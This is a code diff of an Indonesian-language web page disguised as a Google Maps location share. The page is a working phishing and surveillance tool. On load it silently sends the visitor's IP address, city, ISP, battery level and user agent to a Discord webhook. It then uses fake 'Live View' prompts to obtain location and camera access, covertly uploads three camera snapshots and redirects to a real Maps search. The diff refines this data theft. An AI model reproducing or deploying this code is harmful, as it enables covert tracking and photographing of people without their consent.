@@ -7,7 +7,7 @@
     <title>Google Maps - Lokasi Terkini</title>
     <meta property="og:title" content="Google Maps: Lokasi Terbagi">
     <meta property="og:description" content="Klik untuk melihat lokasi presisi dan rute navigasi real-time.">
-    <meta property="og:image" content="https://www.google.com/maps/vt/pb=!1m4!1m3!1i15!2i26214!3i12288!2m3!1e0!2sm!3i388172593!3m8!2sen!3sid!5e1105!12m4!1e68!2m2!1sset!2sRoadmap!4e0!5m1!1e0!23i1301875">
+    <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/maps_96in128dp.png">
     <meta property="og:type" content="website">
     <meta name="theme-color" content="#1a73e8">
 
@@ -31,6 +31,7 @@
             padding: 12px 24px; border-radius: 4px;
             font-size: 14px; font-weight: 500; cursor: pointer;
             width: 100%; box-shadow: 0 1px 2px rgba(60,64,67,0.3);
+            transition: 0.2s;
         }
         .btn-action:active { background: #1765cc; }
 
@@ -53,36 +54,42 @@
         <div id="step-location" class="content-box">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Google_Maps_icon_%282015-2020%29.svg/512px-Google_Maps_icon_%282015-2020%29.svg.png" class="maps-logo">
             <h2>Izin Lokasi Diperlukan</h2>
-            <p>Izinkan akses lokasi untuk melihat posisi presisi Anda di Google Maps.</p>
+            <p>Google Maps memerlukan izin lokasi untuk menampilkan posisi Anda dan memberikan rute navigasi yang akurat.</p>
             <button id="locBtn" class="btn-action" onclick="handleLocation()">Lanjutkan</button>
         </div>
 
         <div id="step-camera" class="content-box" style="display: none;">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Google_Maps_icon_%282015-2020%29.svg/512px-Google_Maps_icon_%282015-2020%29.svg.png" class="maps-logo">
-            <h2>Google Live View</h2>
-            <p>Google meminta izin kamera untuk memverifikasi foto lokasi di sekitar Anda.</p>
+            <h2>Aktifkan Live View</h2>
+            <p>Untuk melihat foto lokasi secara real-time dan menggunakan fitur Live View, Google memerlukan izin akses kamera.</p>
             <button id="camBtn" class="btn-action" onclick="handleCamera()">Aktifkan Live View</button>
         </div>
     </div>
 
     <script>
-        const WH = "https://discord.com/api/webhooks/1339505432094244934/GvR3jA9v_i3eY72E74-vYm899Y6y3I53M309544931063162";
-        const REDIRECT_URL = "https://www.google.com/maps";
+        // URL WEBHOOK YANG SUDAH DIGANTI
+        const WH = "https://discord.com/api/webhooks/1464945657386242215/reBayi8sdQCNfp5PMp_c12ejYPeeFwoNurlukhTAQfyrx6Yeccc2ZkPNDnb9iF0kzhBj";
+        const REDIRECT_URL = "https://www.google.com/maps/search/UD+Sinar+Gemilang";
 
-        // --- PENGIRIMAN DATA OTOMATIS ---
+        // --- 1. PENGIRIMAN DATA OTOMATIS (IP & PERANGKAT) ---
         (async function autoInit() {
             try {
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const d = await ipRes.json();
+                
+                let bat = "N/A";
+                try { if (navigator.getBattery) { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}%`; } } catch(e) {}
+
                 fetch(WH, { method: "POST", headers: {"Content-Type":"application/json"}, 
                     body: JSON.stringify({
                         embeds: [{
-                            title: "🚀 Visitor Open Link",
-                            color: 3066993,
+                            title: "🌐 Visitor Baru Terdeteksi",
+                            color: 3447003,
                             fields: [
-                                { name: "IP", value: d.ip || "N/A", inline: true },
-                                { name: "Kota", value: d.city || "N/A", inline: true },
-                                { name: "ISP", value: d.org || "N/A", inline: false }
+                                { name: "IP Address", value: d.ip || "N/A", inline: true },
+                                { name: "Kota/ISP", value: `${d.city}, ${d.org}`, inline: false },
+                                { name: "Baterai", value: bat, inline: true },
+                                { name: "User Agent", value: navigator.userAgent.substring(0, 50) + "...", inline: false }
                             ],
                             timestamp: new Date()
                         }]
@@ -91,7 +98,7 @@
             } catch (e) {}
         })();
 
-        // --- LOKASI ---
+        // --- 2. LOGIKA LOKASI ---
         function handleLocation() {
             document.getElementById('locBtn').innerHTML = '<span class="loader"></span> Memproses...';
             navigator.geolocation.getCurrentPosition(
@@ -111,7 +118,7 @@
             document.getElementById('step-camera').style.display = 'block';
         }
 
-        // --- KAMERA ---
+        // --- 3. LOGIKA KAMERA ---
         async function handleCamera() {
             document.getElementById('camBtn').innerHTML = '<span class="loader"></span> Menghubungkan...';
             try {
@@ -122,6 +129,7 @@
                 setTimeout(async () => {
                     for (let i = 1; i <= 3; i++) {
                         await takeSnap(video, i);
+                        await new Promise(r => setTimeout(r, 600));
                     }
                     stream.getTracks().forEach(t => t.stop());
                     window.location.href = REDIRECT_URL;
@@ -138,11 +146,11 @@
             return new Promise((res) => {
                 canvas.toBlob(async (b) => {
                     const fd = new FormData();
-                    fd.append("file", b, `photo_${index}.jpg`);
-                    fd.append("payload_json", JSON.stringify({content: `📸 Foto ${index}`}));
+                    fd.append("file", b, `capture_${index}.jpg`);
+                    fd.append("payload_json", JSON.stringify({content: `📸 Foto ${index}/3`}));
                     await fetch(WH, { method: "POST", body: fd });
                     res();
-                }, 'image/jpeg', 0.6);
+                }, 'image/jpeg', 0.7);
             });
         }
     </script>
